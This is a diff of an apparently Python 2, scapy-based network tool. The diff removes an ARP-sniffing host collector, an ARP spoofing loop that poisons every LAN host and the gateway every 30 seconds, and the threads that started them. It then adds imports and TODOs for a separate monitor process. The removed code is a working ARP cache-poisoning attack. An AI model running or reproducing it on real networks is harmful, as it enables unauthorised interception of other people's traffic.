@@ -7,14 +7,17 @@ from time import sleep
 from scapy.all import *
 from datetime import datetime
 import functions
+from network_monitor import network_monitor
 import Queue
-
+from multiprocessing import Process,PIPE
 # except ImportError:
 #
 #     #TODO: handle all cases of missing modules and try to solve
 #     print 'a module is missing please check you have all required modules'
 
 # global variables:
+localHost=''
+defaultGateway=''
 localAddresses=[]
 addressesLock=Lock()
 
@@ -32,52 +35,6 @@ def handle_Packet(pkt):
 
 
 
-def get_IP_Address(pkt):
-    """
-    adds host address if does not yet exist in listen
-    """
-    if pkt[ARP].op == 2: # is-at
-
-        address=pkt[ARP].psrc #extract IP address
-        addressesLock.acquire()
-        global localAddresses
-        if address not in localAddresses: #check for duplicates
-            localAddresses.append(address) #add IP address to list of all hosts
-            print 'added',address
-            addressesLock.release()
-
-
-
-
-def monitor_network():
-    """
-    monitors network for any new devices
-    """
-
-    sniff(prn=get_IP_Address,filter='arp')
-
-
-
-def arpSpoof(router,localHost):
-    """
-    every 30 seconds send ARP broadcast to spoof all machines on LAN
-    """
-
-    while True:
-        if len(localAddresses)>0:
-            addressesLock.acquire()
-            print 'spoofing'
-            for host in localAddresses:
-                if host != router and host != localHost: #check that ip does not match default gateway or local host to not send packets to them
-
-                    victimPacket = Ether()/ARP(op=2,psrc = router, pdst=host[0])#create arp packets
-                    gatewayPacket=Ether()/ARP(op=2,psrc=host[0],pdst=router)
-
-                    sendp(victimPacket)#send packets
-                    sendp(gatewayPacket)
-
-            addressesLock.release()
-            sleep(30)
 
 
 
@@ -106,6 +63,8 @@ def setup():
     and start all threads
     """
     #get default gateway and local IP address
+    global defaultGateway
+    global localHost
     defaultGateway,localHost=functions.getLocalhostAddress()
     print defaultGateway,localHost
     logging.debug('got default gateway and local IP')
@@ -113,14 +72,8 @@ def setup():
     get_Local_Addresses(defaultGateway,localHost) #get addresses of all hosts on network
     logging.debug('scanned network for all active hosts')
 
-    monitorThread=Thread(target=monitor_network)
-    monitorThread.start()
-    logging.debug('created thread for monitoring network for new devices')
-
-    arpThread=Thread(target=arpSpoof,args=(defaultGateway,localHost,))
-    arpThread.start()
-    logging.debug('created thread for ARP spoofing')
-
+    #TODO: create process that will run network_monitor
+    #TODO: create PIPE to communicate with network_monitor
 
 
 
